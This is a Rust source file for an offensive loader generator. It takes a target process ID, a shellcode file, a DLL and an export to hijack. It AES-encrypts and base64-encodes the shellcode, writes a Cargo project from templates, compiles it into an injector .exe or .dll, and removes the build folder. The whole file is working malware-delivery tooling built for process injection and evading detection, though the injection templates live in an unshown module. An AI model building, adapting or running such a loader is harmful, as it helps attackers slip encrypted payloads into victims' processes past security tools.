use my_lib;
use libaes::Cipher;
use std::{env, fs::{File, OpenOptions}, process::Command};
use rand::*;
use std::io::{Read, Write};
use base64::{Engine as _, engine::general_purpose};
use clap::Parser;
use std::fs;

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// Process to inject into
    #[arg(short, long)]
    pid: String,

    /// Path for x64 shellcode 
    #[arg(short, long)]
    shellcode_file: Option<String>,

    /// DLL that contains the export to patch
    #[arg(short, long)]
    dll: String,
       
    /// Exported function that will be hijacked
    #[arg(short, long)]
    export: String,

    /// Name of output file (e.g. loader.exe or loader.dll).
    #[arg(short, long)]
    output: String,
} 


fn main() {
    let args = Args::parse();
    let dll;

    let file = File::open(args.shellcode_file.unwrap()).expect("Unable to open the file");
    
    let encrypted_shellcode = encrypt_shellcode(file);

    if args.output.ends_with(".exe"){
        dll = false;
    }else if args.output.ends_with(".dll"){
        dll = true;
    }else{
        println!("Output must end wit .dll or .exe");
        std::process::exit(1);
    }

    let project_name = args.output.split(".").next().unwrap();

    let mut file = create_project(project_name, dll);


    let libraries = my_lib::libraries();
    let decrypt = my_lib::shellcode_decrypt(encrypted_shellcode.0, encrypted_shellcode.1, encrypted_shellcode.2);
    let code = my_lib::payload_main(args.pid, args.dll, args.export);

    file.write(libraries.as_bytes()).expect("Error writing to main.rs");
    if dll{
        let dll_export = my_lib::dll_export();
        file.write(dll_export.as_bytes()).expect("Error writing to lib.rs");
    }
    file.write(code.as_bytes()).expect("Error writing to main.rs");
    file.write(decrypt.as_bytes()).expect("Error writing to main.rs");


   build_file(project_name);
   cleanup(project_name, &args.output);
   

}

fn build_file(project_name: &str){

    let original_path = env::current_dir().unwrap();
    let project_path = original_path.join(project_name);
    env::set_current_dir(&project_path).expect("Failed to change directory to Rust project");
    let args = vec!["build", "--release", "--quiet"];
    Command::new("cargo")
        .args(&args)
        .status()
        .expect("Failed to execute 'cargo build'");


    env::set_current_dir(&original_path).expect("Failed to change directory back to original path");

}

fn cleanup(project_name: &str, file_name: &str){
    let original_path = env::current_dir().unwrap();
    let project_path = original_path.join(project_name);
    let compiled_file =project_path
            .join("target")
            .join("release")
            .join(format!("{}", file_name));
    
    if !compiled_file.exists() {
        eprintln!("Error: Compiled file not found");
        std::process::exit(1);
    }

    println!("{} Compiled", file_name);

    let target_file = original_path.join(format!("{}", file_name));

    fs::copy(compiled_file, &target_file).expect("Failed to copy compiled file");
    fs::remove_dir_all(project_path).expect("Failed to remove Rust project folder");


}


fn encrypt_shellcode(mut file: File) -> (String, String, String) {
    let mut plaintext = Vec::new();
    file.read_to_end(&mut plaintext)
    .expect("Unable to read the file");

    let mut rng = rand::thread_rng();
    let key: [u8; 32] = rng.gen();
    let iv: [u8; 32] = rng.gen();

    let cipher = Cipher::new_256(&key);
    let encrypted = cipher.cbc_encrypt(&iv, &plaintext);

    let shellcode: String = general_purpose::STANDARD_NO_PAD.encode(encrypted.clone());
    let key: String = general_purpose::STANDARD_NO_PAD.encode(key.clone());
    let iv: String = general_purpose::STANDARD_NO_PAD.encode(iv.clone());

    (shellcode, key, iv)
}

fn create_project(project_name: &str, dll: bool) -> File{

    let mut cargo_args = vec!["new", project_name];
    if dll{
        cargo_args.push("--lib");
    }
    Command::new("cargo")
        .args(cargo_args)
        .output()
        .expect("Failed to create a new Rust project");

    let mut cargo_toml = OpenOptions::new()
    .append(true)
    .open(format!("{}/Cargo.toml", project_name))
    .expect("Unable to open Cargo.toml");
    let dependencies = my_lib::dependencies();
    cargo_toml.write(dependencies.as_bytes()).expect("Error writing to Cargo.toml");

    if dll{
        let cdylib = my_lib::cdylib();
        cargo_toml.write(cdylib.as_bytes()).expect("Error writing to Cargo.toml");
        File::create(format!("{}/src/lib.rs", project_name)).expect("Failed to open lib.rs")

    }else {
        File::create(format!("{}/src/main.rs", project_name)).expect("Failed to open main.rs")
    }


}